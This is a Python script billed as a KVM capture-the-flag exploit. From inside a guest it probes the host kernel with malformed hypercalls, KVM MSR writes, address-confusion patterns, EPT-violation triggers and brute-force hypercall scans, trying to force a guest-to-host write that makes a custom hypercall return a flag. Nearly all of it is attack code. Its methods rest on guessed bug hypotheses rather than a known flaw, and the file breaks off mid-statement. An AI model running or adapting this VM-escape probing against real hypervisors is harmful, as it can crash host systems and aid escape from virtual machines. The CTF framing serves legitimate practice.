#!/usr/bin/env python3
"""
KVM CTF Error Handling Exploit v11.0 - Guest to Host Write

Focus: Exploit KVM error handling bugs to write from guest to host kernel
Target: Write to host's write_flag @ unknown host address, then HC#100 returns flag
"""

import os
import sys
import struct
import time
import argparse
from typing import Optional, List, Tuple

try:
    from kvm_probe_interface import KVMProbe
except ImportError:
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from kvm_probe_interface import KVMProbe

# ============================================================================
# Colors
# ============================================================================

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; E = '\033[0m'
    BOLD = '\033[1m'

def banner():
    print(f"""{C.R}
╔═══════════════════════════════════════════════════════════════════════════╗
║  {C.W}KVM CTF Error Handling Exploit v11.0 - Guest to Host Write{C.R}                ║
╠═══════════════════════════════════════════════════════════════════════════╣
║  {C.Y}Focus:{C.R}  KVM error handling bugs for guest->host writes                 ║
║  {C.Y}Goal:{C.R}  Write to host's write_flag, then HC#100 returns flag           ║
╚═══════════════════════════════════════════════════════════════════════════╝
{C.E}""")

# ============================================================================
# KVM Hypercall Numbers (from linux/kvm_para.h)
# ============================================================================

KVM_HC_VAPIC_POLL_IRQ = 1
KVM_HC_MMU_OP = 2
KVM_HC_FEATURES = 3
KVM_HC_KICK_CPU = 5
KVM_HC_CLOCK_PAIRING = 9
KVM_HC_SEND_IPI = 10
KVM_HC_SCHED_YIELD = 11
KVM_HC_MAP_GPA_RANGE = 12

# KVM MSRs
MSR_KVM_WALL_CLOCK = 0x11
MSR_KVM_SYSTEM_TIME = 0x12
MSR_KVM_WALL_CLOCK_NEW = 0x4b564d00
MSR_KVM_SYSTEM_TIME_NEW = 0x4b564d01
MSR_KVM_ASYNC_PF_EN = 0x4b564d02
MSR_KVM_STEAL_TIME = 0x4b564d03
MSR_KVM_PV_EOI_EN = 0x4b564d04

# Target addresses (from guest perspective)
WRITE_FLAG_PHYS = 0x64279a8
WRITE_FLAG_VIRT = 0xffffffff826279a8

FLAG_PATTERNS = [b'flag{', b'FLAG{', b'CTF{', b'ctf{', b'KVMCTF{']
FLAG_TRIGGER_VALUES = [
    0xdeadbeef41424344,  # deadbeef + ABCD
    0x44434241efbeadde,  # DCBA + deadbeef reversed
    0x1,                 # Any non-zero value
    0xFFFFFFFFFFFFFFFF,  # All ones
]

# ============================================================================
# KVM Exploit
# ============================================================================

class KVMExploit:
    def __init__(self, verbose: bool = False):
        self.probe = None
        self.verbose = verbose
        self.flag = None
        
        try:
            self.probe = KVMProbe(verbose=verbose)
            if not self.probe.is_available() or not self.probe.test_connection():
                print(f"{C.R}[-]{C.E} Cannot connect to kvm_probe_drv")
                self.probe = None
                return
            print(f"{C.G}[+]{C.E} Connected to kvm_probe_drv")
        except Exception as e:
            print(f"{C.R}[-]{C.E} Init failed: {e}")
            self.probe = None
    
    def close(self):
        if self.probe:
            self.probe.close()
    
    def log(self, msg: str, level: str = "info"):
        prefix = {
            "info": f"{C.B}[*]{C.E}", "ok": f"{C.G}[+]{C.E}", "warn": f"{C.Y}[!]{C.E}",
            "err": f"{C.R}[-]{C.E}", "try": f"{C.M}[TRY]{C.E}", 
            "flag": f"{C.G}{C.BOLD}[FLAG]{C.E}", "kvm": f"{C.CY}[KVM]{C.E}"
        }.get(level, "[?]")
        print(f"  {prefix} {msg}")
    
    def hc(self, nr: int, a0: int = 0, a1: int = 0, a2: int = 0, a3: int = 0) -> int:
        return self.probe.hypercall(nr, a0, a1, a2, a3)
    
    def check_flag_hc100(self) -> Optional[str]:
        """Check if HC#100 now returns flag"""
        # Try with no args first
        ret = self.hc(100, 0, 0, 0, 0)
        
        if ret and ret != 0xffffffffffffffff:
            b = struct.pack('<Q', ret)
            if all(32 <= c < 127 or c == 0 for c in b):
                text = b.rstrip(b'\x00').decode('ascii', errors='ignore')
                if text:
                    self.log(f"HC#100 = 0x{ret:x} \"{text}\"", "ok")
                    for p in FLAG_PATTERNS:
                        if p in b:
                            return text
        
        # Also try with output buffer
        out_addr = 0x100000
        self.probe.write_physical(out_addr, b'\x00' * 256)
        
        # Various calling conventions
        self.hc(100, out_addr, 256, 0, 0)
        self.hc(100, 0, out_addr, 256, 0)
        
        data = self.probe.read_physical(out_addr, 256)
        if data:
            for p in FLAG_PATTERNS:
                if p in data:
                    start = data.find(p)
                    end = data.find(b'}', start)
                    if end != -1:
                        return data[start:end+1].decode('ascii', errors='ignore')
        
        return None
    
    # ========================================================================
    # EXPLOIT 1: KVM_HC_CLOCK_PAIRING Error Handling
    # ========================================================================
    
    def exploit_clock_pairing_error(self):
        """
        KVM_HC_CLOCK_PAIRING writes 80 bytes to GPA via kvm_write_guest().
        
        Bug hypothesis: Error handling might write to host address instead of guest
        when certain error conditions are met (invalid params, EPT violations, etc.)
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} EXPLOIT 1: KVM_HC_CLOCK_PAIRING ERROR HANDLING{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        # struct kvm_clock_pairing is 80 bytes
        # Contains: sec, nsec, tsc, flags, pad[9]
        
        # Test 1: Normal addresses with error-inducing parameters
        test_addrs = [
            # Guest addresses (should be safe)
            WRITE_FLAG_PHYS,
            WRITE_FLAG_VIRT,
            0x100000,
            
            # Host-looking addresses (might trigger confusion)
            0xffffffff826279a8,  # Host kernel virtual
            0xffff888000000000,  # Direct mapping base
            0xffffffff80000000,  # Kernel text
            0xfffffe0000000000,  # vmemmap
            
            # Edge cases
            0x0,
            0xFFFFFFFFFFFFFFFF,
            0x7FFFFFFFFFFFFFFF,
            0x8000000000000000,
        ]
        
        for addr in test_addrs:
            self.log(f"Testing CLOCK_PAIRING @ 0x{addr:x}", "try")
            
            # Try valid clock_type (0 = KVM_CLOCK_PAIRING_WALLCLOCK)
            ret = self.hc(KVM_HC_CLOCK_PAIRING, addr, 0, 0, 0)
            self.log(f"  clock_type=0: ret=0x{ret & 0xffffffffffffffff:x}", "kvm")
            
            # Check if write_flag was triggered
            flag = self.check_flag_hc100()
            if flag:
                self.log(f"FLAG: {flag}", "flag")
                return flag
            
            # Try invalid clock_types to trigger error paths
            for clock_type in [1, 2, 0xFF, 0xFFFFFFFF, 0xFFFFFFFFFFFFFFFF]:
                ret = self.hc(KVM_HC_CLOCK_PAIRING, addr, clock_type, 0, 0)
                
                # Some returns might be interesting
                if ret not in [0, 0xffffffffffffffff, 0xfffffffffffffc18]:
                    self.log(f"  clock_type={clock_type:x}: ret=0x{ret:x} (interesting)", "ok")
                
                flag = self.check_flag_hc100()
                if flag:
                    self.log(f"FLAG via error path: {flag}", "flag")
                    return flag
            
            # Try with invalid size/length in a2
            for size in [0, 1, 79, 81, 0xFFFFFFFF]:
                ret = self.hc(KVM_HC_CLOCK_PAIRING, addr, 0, size, 0)
                flag = self.check_flag_hc100()
                if flag:
                    self.log(f"FLAG with size={size}: {flag}", "flag")
                    return flag
        
        # Test 2: Rapid fire to trigger race conditions
        self.log("Rapid fire CLOCK_PAIRING calls...", "try")
        
        for i in range(100):
            # Alternate between guest and host-looking addresses
            self.hc(KVM_HC_CLOCK_PAIRING, WRITE_FLAG_PHYS, 0, 0, 0)
            self.hc(KVM_HC_CLOCK_PAIRING, 0xffffffff826279a8, 0, 0, 0)
            
            if i % 10 == 0:
                flag = self.check_flag_hc100()
                if flag:
                    self.log(f"FLAG after {i} iterations: {flag}", "flag")
                    return flag
        
        return None
    
    # ========================================================================
    # EXPLOIT 2: Address Space Confusion
    # ========================================================================
    
    def exploit_address_confusion(self):
        """
        Exploit GPA/HPA (Guest Physical / Host Physical) confusion.
        
        KVM translates GPA->HPA via EPT. A bug might allow writing to HPA directly
        when given certain address patterns.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} EXPLOIT 2: ADDRESS SPACE CONFUSION (GPA/HPA){C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        # Patterns that might confuse EPT translation
        confusion_patterns = [
            # Same numeric value but with different interpretation
            (WRITE_FLAG_PHYS, "Original target"),
            
            # With high bits set (might bypass checks)
            (WRITE_FLAG_PHYS | (1 << 63), "Bit 63 set"),
            (WRITE_FLAG_PHYS | (1 << 47), "Bit 47 set"),
            
            # With EPT-related bits
            (WRITE_FLAG_PHYS | (1 << 7), "EPT bit 7"),
            (WRITE_FLAG_PHYS | (1 << 8), "EPT bit 8"),
            
            # Masked versions
            (WRITE_FLAG_PHYS & 0x0000FFFFFFFFFFFF, "Masked high bits"),
            (WRITE_FLAG_PHYS & 0xFFFFFFFF, "32-bit version"),
            
            # Page-aligned and misaligned
            (WRITE_FLAG_PHYS & ~0xFFF, "Page-aligned"),
            (WRITE_FLAG_PHYS | 0x800, "Page-misaligned"),
            
            # Addresses near overflow for 80-byte write
            (0xFFFFFFFFFFFFFFB0, "Near overflow (80 bytes from max)"),
            (0xFFFFFFFFFFFFFFFF - 79, "Exactly 80 bytes from max"),
        ]
        
        for addr, desc in confusion_patterns:
            self.log(f"Testing {desc}: 0x{addr:x}", "try")
            
            # Try clock pairing
            for clock_type in [0, 1, 0xFF]:
                ret = self.hc(KVM_HC_CLOCK_PAIRING, addr, clock_type, 0, 0)
                
                # Also try MAP_GPA_RANGE (different code path)
                ret2 = self.hc(KVM_HC_MAP_GPA_RANGE, addr, 1, 0, 0)
                
                flag = self.check_flag_hc100()
                if flag:
                    self.log(f"FLAG with {desc}: {flag}", "flag")
                    return flag
        
        # Test 3: Sequential writes that might corrupt translation caches
        self.log("Testing sequential address confusion...", "try")
        
        sequence = [
            (0x100000, 0),      # Valid guest page
            (WRITE_FLAG_PHYS, 0),  # Target
            (0x200000, 0),      # Another valid page
            (0xffffffff826279a8, 0),  # Host kernel address
        ]
        
        for _ in range(10):  # Repeat sequence
            for addr, clock_type in sequence:
                self.hc(KVM_HC_CLOCK_PAIRING, addr, clock_type, 0, 0)
                
                flag = self.check_flag_hc100()
                if flag:
                    return flag
        
        return None
    
    # ========================================================================
    # EXPLOIT 3: EPT Violation Trigger
    # ========================================================================
    
    def exploit_ept_violation(self):
        """
        Trigger EPT violations and see if error handling writes to wrong place.
        
        Writing to non-existent or protected GPA should cause EPT violation.
        KVM's violation handler might have bugs.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} EXPLOIT 3: EPT VIOLATION TRIGGER{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        # Addresses that should cause EPT violations
        violation_addrs = [
            0x0,                    # NULL page
            0xFFFFFFFFF000,        # Last page of 4-level paging
            0xFFFFFFFFFFF00000,    # MMIO/reserved area
            0xDEADBEEF000,         # Random non-mapped
            0x7FFFFFFF0000,        # High user space (might not be mapped)
        ]
        
        for addr in violation_addrs:
            self.log(f"Triggering EPT violation @ 0x{addr:x}", "try")
            
            # Try clock pairing (80-byte write)
            ret = self.hc(KVM_HC_CLOCK_PAIRING, addr, 0, 0, 0)
            self.log(f"  Result: 0x{ret:x}", "kvm")
            
            # Try with error-inducing parameters
            for clock_type in [1, 0xFF, 0xFFFFFFFF]:
                self.hc(KVM_HC_CLOCK_PAIRING, addr, clock_type, 0, 0)
            
            # Check if write_flag was accidentally written
            flag = self.check_flag_hc100()
            if flag:
                self.log(f"FLAG after EPT violation: {flag}", "flag")
                return flag
        
        # Test: Rapid violations
        self.log("Rapid EPT violation testing...", "try")
        
        for i in range(50):
            # Alternate between violation address and valid address
            self.hc(KVM_HC_CLOCK_PAIRING, 0x0, 0, 0, 0)  # NULL page violation
            self.hc(KVM_HC_CLOCK_PAIRING, 0x100000, 0, 0, 0)  # Valid page
            
            if i % 5 == 0:
                flag = self.check_flag_hc100()
                if flag:
                    self.log(f"FLAG after {i} violations: {flag}", "flag")
                    return flag
        
        return None
    
    # ========================================================================
    # EXPLOIT 4: PTP_KVM Module Interaction
    # ========================================================================
    
    def exploit_ptp_kvm(self):
        """
        Target ptp_kvm.ko module which uses KVM_CLOCK_PAIRING internally.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} EXPLOIT 4: PTP_KVM MODULE INTERACTION{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        # ptp_kvm uses:
        # - ptp_kvm_gettime() -> kvm_arch_ptp_get_clock() -> kvm_hypercall(KVM_HC_CLOCK_PAIRING)
        # - Might have different error paths
        
        self.log("Testing PTP_KVM-specific patterns...", "info")
        
        # Pattern 1: Try clock types that ptp_kvm might use
        # (PTP might use different clock types than standard KVM)
        ptp_clock_types = [0, 1, 2, 3, 0x100, 0x101]
        
        for clock_type in ptp_clock_types:
            self.log(f"Testing PTP-like clock_type={clock_type}", "try")
            
            # Try with various addresses
            for addr in [WRITE_FLAG_PHYS, WRITE_FLAG_VIRT, 0xffffffff826279a8]:
                self.hc(KVM_HC_CLOCK_PAIRING, addr, clock_type, 0, 0)
                
                flag = self.check_flag_hc100()
                if flag:
                    self.log(f"FLAG with PTP clock_type {clock_type}: {flag}", "flag")
                    return flag
        
        # Pattern 2: Rapid PTP-like accesses (as if clock is being read frequently)
        self.log("Simulating rapid PTP clock reads...", "try")
        
        for i in range(100):
            # Simulate PTP reading time
            self.hc(KVM_HC_CLOCK_PAIRING, WRITE_FLAG_PHYS, 0, 0, 0)
            
            # Every 10 reads, check if flag is ready
            if i % 10 == 0:
                flag = self.check_flag_hc100()
                if flag:
                    self.log(f"FLAG after {i} PTP reads: {flag}", "flag")
                    return flag
        
        # Pattern 3: Check for extended hypercalls (ptp_kvm might register its own)
        self.log("Scanning for custom hypercalls...", "try")
        
        for hc_nr in range(1000, 1100):  # Extended range
            ret = self.hc(hc_nr, 0, 0, 0, 0)
            if ret != 0xfffffffffffffc18:  # Not ENOSYS
                self.log(f"Hypercall {hc_nr} returns: 0x{ret:x}", "ok")
                
                # Try with write_flag address
                self.hc(hc_nr, WRITE_FLAG_PHYS, 0, 0, 0)
                self.hc(hc_nr, WRITE_FLAG_VIRT, 0, 0, 0)
                
                flag = self.check_flag_hc100()
                if flag:
                    self.log(f"FLAG via custom HC {hc_nr}: {flag}", "flag")
                    return flag
        
        return None
    
    # ========================================================================
    # EXPLOIT 5: Combined Error Path Trigger
    # ========================================================================
    
    def exploit_combined_errors(self):
        """
        Combine multiple error conditions to trigger complex bug.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} EXPLOIT 5: COMBINED ERROR PATH TRIGGER{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        self.log("Combining multiple error conditions...", "info")
        
        # Complex sequences that might trigger edge cases
        sequences = [
            # Sequence 1: Valid -> Invalid -> Target
            [
                (0x100000, 0, 0, 0),        # Valid
                (0x0, 0xFF, 0, 0),          # Invalid params
                (WRITE_FLAG_PHYS, 0, 0, 0), # Target
            ],
            
            # Sequence 2: Host address -> Guest address -> Host address
            [
                (0xffffffff826279a8, 0, 0, 0),
                (WRITE_FLAG_PHYS, 0, 0, 0),
                (0xffff888000000000, 0, 0, 0),
            ],
            
            # Sequence 3: Overflow pattern
            [
                (0xFFFFFFFFFFFFFFB0, 0, 0, 0),  # Near overflow
                (WRITE_FLAG_PHYS, 0, 0, 0),
                (0xFFFFFFFFFFFFFFFF, 0, 0, 0),  # Max address
            ],
        ]
        
        for seq_idx, sequence in enumerate(sequences):
            self.log(f"Running sequence {seq_idx + 1}", "try")
            
            for _ in range(5):  # Repeat each sequence
                for a0, a1, a2, a3 in sequence:
                    self.hc(KVM_HC_CLOCK_PAIRING, a0, a1, a2, a3)
                
                flag = self.check_flag_hc100()
                if flag:
                    self.log(f"FLAG with sequence {seq_idx}: {flag}", "flag")
                    return flag
        
        # Try interleaving with other hypercalls
        self.log("Interleaving with other hypercalls...", "try")
        
        for _ in range(20):
            # Clock pairing to target
            self.hc(KVM_HC_CLOCK_PAIRING, WRITE_FLAG_PHYS, 0, 0, 0)
            
            # Other KVM hypercalls that might affect state
            self.hc(KVM_HC_FEATURES, 0, 0, 0, 0)
            self.hc(KVM_HC_SCHED_YIELD, 0, 0, 0, 0)
            
            # CTF hypercalls
            for hc in [101, 102, 103]:
                self.hc(hc, WRITE_FLAG_PHYS, 0, 0, 0)
            
            flag = self.check_flag_hc100()
            if flag:
                return flag
        
        return None
    
    # ========================================================================
    # EXPLOIT 6: Direct Pattern Write (from guest perspective)
    # ========================================================================
    
    def exploit_direct_pattern(self):
        """
        Write expected patterns to guest addresses in case host is reading from guest.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} EXPLOIT 6: DIRECT PATTERN WRITE (Guest){C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        self.log("Writing flag trigger patterns to guest addresses...", "info")
        
        # Try different patterns that might trigger the flag
        patterns = [
            # Based on hints: 44434241efbeadde or deadbeef41424344
            struct.pack('<Q', 0xdeadbeef41424344),
            struct.pack('<Q', 0x44434241efbeadde),
            struct.pack('<Q', 0x1),                 # Just non-zero
            struct.pack('<Q', 0xFFFFFFFFFFFFFFFF),  # All ones
            
            # ASCII patterns
            b'abcd\x00\x00\x00\x00',
            b'dcba\x00\x00\x00\x00',
            b'ctf\x00\x00',
            
            # Multi-QWORD patterns
            struct.pack('<QQ', 0xdeadbeef, 0x41424344),
            struct.pack('<QQ', 0x44434241, 0xefbeadde),
        ]
        
        addresses = [
            WRITE_FLAG_PHYS,
            WRITE_FLAG_VIRT,
            0x6427900,  # Nearby address
            0x6427a00,  # Another nearby
        ]
        
        for addr in addresses:
            for pattern_idx, pattern in enumerate(patterns):
                self.log(f"Writing pattern {pattern_idx} to 0x{addr:x}", "try")
                
                # Write the pattern
                self.probe.write_physical(addr, pattern)
                
                # Flush cache (important!)
                self.probe.wbinvd()
                
                # Try HC#100 immediately
                ret = self.hc(100, 0, 0, 0, 0)
                if ret != 0:
                    b = struct.pack('<Q', ret)
                    text = b.decode('ascii', errors='ignore')
                    self.log(f"HC#100 changed: 0x{ret:x} = '{text}'", "ok")
                    
                    flag = self.check_flag_hc100()
                    if flag:
                        return flag
                
                # Also try calling HC#100 with the address
                ret = self.hc(100, addr, 0, 0, 0)
                if ret != 0:
                    self.log(f"HC#100({addr:x}) = 0x{ret:x}", "ok")
                    return self.check_flag_hc100()
        
        return None
    
    # ========================================================================
    # EXPLOIT 7: MSR-Based Attacks (if available)
    # ========================================================================
    
    def exploit_msr_attacks(self):
        """
        Try MSR-based attacks if driver supports it.
        Some KVM MSRs take addresses.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} EXPLOIT 7: MSR-BASED ATTACKS{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        self.log("Attempting MSR operations...", "info")
        
        # Check if driver supports MSR operations
        if not hasattr(self.probe, 'wrmsr') or not callable(self.probe.wrmsr):
            self.log("MSR operations not supported by driver", "warn")
            return None
        
        # MSRs that might take addresses
        msr_list = [
            (MSR_KVM_WALL_CLOCK_NEW, "WALL_CLOCK_NEW"),
            (MSR_KVM_SYSTEM_TIME_NEW, "SYSTEM_TIME_NEW"),
            (MSR_KVM_ASYNC_PF_EN, "ASYNC_PF_EN"),
            (MSR_KVM_STEAL_TIME, "STEAL_TIME"),
            (MSR_KVM_PV_EOI_EN, "PV_EOI_EN"),
        ]
        
        for msr, name in msr_list:
            self.log(f"Trying MSR {name} (0x{msr:x})", "try")
            
            # Try writing target addresses
            for addr in [WRITE_FLAG_PHYS, WRITE_FLAG_VIRT, 0xffffffff826279a8]:
                try:
                    self.probe.wrmsr(msr, addr)
                    self.log(f"  Wrote 0x{addr:x} to MSR 0x{msr:x}", "kvm")
                    
                    # Check if flag triggered
                    flag = self.check_flag_hc100()
                    if flag:
                        self.log(f"FLAG after MSR {name}: {flag}", "flag")
                        return flag
                except Exception as e:
                    self.log(f"  MSR write failed: {e}", "warn")
        
        return None
    
    # ========================================================================
    # EXPLOIT 8: Systematic Hypercall Fuzzing
    # ========================================================================
    
    def exploit_systematic_fuzz(self):
        """
        Systematic fuzzing of KVM hypercalls with interesting values.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} EXPLOIT 8: SYSTEMATIC HYPERCALL FUZZING{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        # Interesting value patterns
        interesting_vals = [
            0x0,
            0x1,
            0xFFFFFFFF,
            0xFFFFFFFFFFFFFFFF,
            0x7FFFFFFFFFFFFFFF,
            0x8000000000000000,
            WRITE_FLAG_PHYS,
            WRITE_FLAG_VIRT,
            0xffffffff826279a8,
            0xdeadbeef,
            0xcafebabe,
            0xbadc0de,
        ]
        
        # KVM hypercalls to test
        kvm_hcs = [
            KVM_HC_CLOCK_PAIRING,
            KVM_HC_MAP_GPA_RANGE,
            KVM_HC_FEATURES,
            KVM_HC_MMU_OP,
        ]
        
        # CTF hypercalls
        ctf_hcs = [100, 101, 102, 103]
        
        all_hcs = kvm_hcs + ctf_hcs
        
        self.log(f"Fuzzing {len(all_hcs)} hypercalls...", "info")
        
        count = 0
        for hc_nr in all_hcs:
            for a0 in interesting_vals:
                for a1 in interesting_vals[:6]:  # Limit combinations
                    count += 1
                    if count % 10 == 0:
                        self.log(f"Tested {count} combinations...", "kvm")
                    
                    ret = self.hc(hc_nr, a0, a1, 0, 0)
                    
                    # Check for non-standard returns
                    if ret not in [0, 0xffffffffffffffff, 0xfffffffffffffc18]:
                        self.log(f"Interesting: HC{hc_nr}(0x{a0:x}, 0x{a1:x}) = 0x{ret:x}", "ok")
                    
                    # Check if flag triggered
                    flag = self.check_flag_hc100()
                    if flag:
                        self.log(f"FLAG after HC{hc_nr}(0x{a0:x}, 0x{a1:x}): {flag}", "flag")
                        return flag
        
        self.log(f"Completed {count} combinations", "info")
        return None
    
    # ========================================================================
    # RUN ALL EXPLOITS
    # ========================================================================
    
    def run_all_exploits(self) -> Optional[str]:
        """
        Run all exploit strategies in priority order.
        """
        
        # Priority ordering based on likelihood
        exploits = [
            ("Clock Pairing Error", self.exploit_clock_pairing_error),
            ("Address Confusion", self.exploit_address_confusion),
            ("EPT Violation", self.exploit_ept_violation),
            ("Direct Pattern Write", self.exploit_direct_pattern),
            ("Combined Errors", self.exploit_combined_errors),
            ("PTP_KVM", self.exploit_ptp_kvm),
            ("Systematic Fuzz", self.exploit_systematic_fuzz),
            ("MSR Attacks", self.exploit_msr_attacks),
        ]
        
        for name, func in exploits:
            self.log(f"Running: {name}", "info")
            flag = func()
            if flag:
                self.flag = flag
                return flag
        
        return None

# ============================================================================
# Main
# ============================================================================

def main():
    parser = argparse.ArgumentParser(description='KVM CTF Error Handling Exploit v11.0')
    parser.add_argument('--clock', action='store_true', help='Clock pairing exploit')
    parser.add_argument('--address', action='store_true', help='Address confusion exploit')
    parser.add_argument('--ept', action='store_true', help='EPT violation exploit')
    parser.add_argument('--ptp', action='store_true', help='PTP_KVM exploit')
    parser.add_argument('--combined', action='store_true', help='Combined errors exploit')
    parser.add_argument('--pattern', action='store_true', help='Direct pattern write')
    parser.add_argument('--msr', action='store_true', help='MSR attacks')
    parser.add_argument('--fuzz', action='store_true', help='Systematic fuzzing')
    parser.add_argument('--all', action='store_true', help='Run all exploits (default)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    banner()
    exploit = KVMExploit(verbose=args.verbose)
    
    if not exploit.probe:
        print(f"{C.R}[-]{C.E} Failed to initialize - no kvm_probe_drv connection")
        return
    
    try:
        flag = None
        
        # Default: run all if no specific exploit chosen
        if args.all or not any([args.clock, args.address, args.ept, args.ptp,
                                args.combined, args.pattern, args.msr, args.fuzz]):
            exploit.log("Running all exploit strategies...", "info")
            flag = exploit.run_all_exploits()
        else:
            # Run selected exploits
            if args.clock:
                flag = exploit.exploit_clock_pairing_error()
            if not flag and args.address:
                flag = exploit.exploit_address_confusion()
            if not flag and args.ept:
                flag = exploit.exploit_ept_violation()
            if not flag and args.ptp:
                flag = exploit.exploit_ptp_kvm()
            if not flag and args.combined:
                flag = exploit.exploit_combined_errors()
            if not flag and args.pattern:
                flag = exploit.exploit_direct_pattern()
            if not flag and args.msr:
                flag = exploit.exploit_msr_attacks()
            if not flag and args.fuzz:
                flag = exploit.exploit_systematic_fuzz()
        
        # Report result
        if flag:
            print(f"\n{C.G}{'='*70}{C.E}")
            print(f"{C.G}{C.BOLD} SUCCESS! FLAG CAPTURED: {flag}{C.E}")
            print(f"{C.G}{'='*70}{C.E}")
        else:
            print(f"\n{C.R}{'='*70}{C.E}")
            print(f"{C.R} NO FLAG FOUND{C.E}")
            print(f"{C.R}{'='*70}{C.E}")
            
            # Provide debug info
            exploit.log("Debug information:", "info")
            exploit.log(f"  HC#100 returns: 0x{exploit.hc(100, 0, 0, 0, 0):x}", "kvm")
            exploit.log(f"  HC#101 returns: 0x{exploit.hc(101, 0, 0, 0, 0):x}", "kvm")
            exploit.log(f"  HC#102 returns: 0x{exploit.hc(102, 0, 0, 0, 0):x}", "kvm")
            exploit.log(f"  HC#103 returns: 0x{exploit.hc(103, 0, 0, 0, 0):x}", "kvm")
            
            # Also check what's at the guest addresses (for debugging)
            try:
                phys_data = exploit.probe.read_physical(WRITE_FLAG_PHYS, 8)
                virt_data = exploit.probe.read_physical(WRITE_FLAG_VIRT, 8)
                exploit.log(f"  Guest 0x{WRITE_FLAG_PHYS:x} contains: {phys_data.hex()}", "kvm")
                exploit.log(f"  Guest 0x{WRITE_FLAG_VIRT:x} contains: {virt_data.hex()}", "kvm")
            except:
                exploit.log("  Could not read guest addresses", "warn")
    
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!]{C.E} Interrupted")
    except Exception as e:
        print(f"\n{C.R}[!]{C.E} Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        exploit.close()

# ============================================================================
# SIMPLIFIED ESCAPE TEST
# ============================================================================

def simple_escape_test():
    """
    Simple focused test: Just try to trigger the KVM bug and capture flag
    """
    print(f"\n{C.CY}{'='*70}{C.E}")
    print(f"{C.CY} SIMPLIFIED ESCAPE TEST{C.E}")
    print(f"{C.CY}{'='*70}{C.E}")
    
    exploit = KVMExploit(verbose=False)
    if not exploit.probe:
        return
    
    try:
        # Baseline
        baseline = exploit.hc(100, 0, 0, 0, 0)
        print(f"{C.B}[*]{C.E} Baseline HC#100: 0x{baseline:x}")
        
        # Target host addresses
        host_targets = [
            0xffffffff826279a8,  # Host kernel virtual
            0x64279a8,           # Might be host physical
        ]
        
        # Try KVM_HC_CLOCK_PAIRING with various error conditions
        print(f"{C.B}[*]{C.E} Testing KVM_HC_CLOCK_PAIRING with host addresses...")
        
        for target in host_targets:
            print(f"  {C.M}[TRY]{C.E} Target: 0x{target:x}")
            
            # Test different parameter combinations
            for clock_type in [0, 1, 2, 0xFF, 0xFFFFFFFF]:
                for a2 in [0, 80, 0xFFFFFFFF]:  # size parameter
                    ret = exploit.hc(9, target, clock_type, a2, 0)
                    
                    # Immediately check HC#100
                    hc100 = exploit.hc(100, 0, 0, 0, 0)
                    
                    # If HC#100 returns anything other than 0 or 0xffffffffffffffff, that's the flag!
                    if hc100 != 0 and hc100 != 0xffffffffffffffff:
                        print(f"\n{C.G}[+]{C.E} SUCCESS!")
                        print(f"{C.G}[+]{C.E} Parameters: HC9(0x{target:x}, {clock_type}, {a2})")
                        print(f"{C.G}[+]{C.E} HC#100 now returns: 0x{hc100:x}")
                        
                        # Try to interpret
                        as_bytes = struct.pack('<Q', hc100)
                        print(f"{C.G}[+]{C.E} As bytes: {as_bytes.hex()}")
                        print(f"{C.G}[+]{C.E} As ASCII: {as_bytes}")
                        
                        exploit.close()
                        return hc100
        
        # Try rapid fire
        print(f"{C.B}[*]{C.E} Testing rapid fire...")
        
        for i in range(100):
            exploit.hc(9, 0xffffffff826279a8, 0, 0, 0)
            
            if i % 10 == 0:
                hc100 = exploit.hc(100, 0, 0, 0, 0)
                if hc100 != 0 and hc100 != 0xffffffffffffffff:
                    print(f"\n{C.G}[+]{C.E} FLAG after {i} iterations: 0x{hc100:x}")
                    exploit.close()
                    return hc100
        
        print(f"\n{C.R}[-]{C.E} No escape found")
        
    finally:
        exploit.close()

# ============================================================================
# BRUTE FORCE ALL HYPERCALLS
# ============================================================================

def brute_force_all():
    """
    Brute force all hypercalls with target addresses
    """
    print(f"\n{C.CY}{'='*70}{C.E}")
    print(f"{C.CY} BRUTE FORCE ALL HYPERCALLS{C.E}")
    print(f"{C.CY}{'='*70}{C.E}")
    
    exploit = KVMExploit(verbose=False)
    if not exploit.probe:
        return
    
    try:
        targets = [0xffffffff826279a8, 0x64279a8]
        
        # Test hypercalls 0-200
        for hc_nr in range(0, 201):
            # Skip known ones we've already tested
            if hc_nr in [9, 12, 100, 101, 102, 103]:
                continue
                
            for target in targets:
                # Try with 0
                ret = exploit.hc(hc_nr, target, 0, 0, 0)
                
                # Check HC#100
                hc100 = exploit.hc(100, 0, 0, 0, 0)
                if hc100 != 0 and hc100 != 0xffffffffffffffff:
                    print(f"\n{C.G}[+]{C.E} Found with HC{hc_nr}(0x{target:x})")
                    print(f"{C.G}[+]{C.E} HC#100: 0x{hc100:x}")
                    exploit.close()
                    return hc100
                
                # Try with 1
                ret = exploit.hc(hc_nr, target, 1, 0, 0)
                hc100 = exploit.hc(100, 0, 0, 0, 0)
                if hc100 != 0 and hc100 != 0xffffffffffffffff:
                    print(f"\n{C.G}[+]{C.E} Found with HC{hc_nr}(0x{target:x}, 1)")
                    print(f"{C.G}[+]{C.E} HC#100: 0x{hc100:x}")
                    exploit.close()
                    return hc100
        
        print(f"\n{C.R}[-]{C.E} Brute force completed, no escape")
        
    finally:
        exploit.close()

if __name__ == '__main__':
    # First run the simple test
    flag = simple_escape_test()
    
    if flag:
